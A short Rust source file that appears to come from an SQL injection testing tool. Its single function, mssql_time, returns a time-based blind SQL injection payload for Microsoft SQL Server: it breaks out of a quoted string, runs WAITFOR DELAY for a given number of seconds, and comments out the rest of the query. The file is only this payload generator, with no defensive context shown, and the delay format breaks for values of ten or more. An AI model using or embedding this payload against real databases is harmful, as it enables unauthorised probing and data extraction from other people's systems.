#![deny(unsafe_code)]
#[must_use]
pub fn mssql_time(secs: u64) -> String {
    format!("'; WAITFOR DELAY '00:00:0{secs}' --")
}
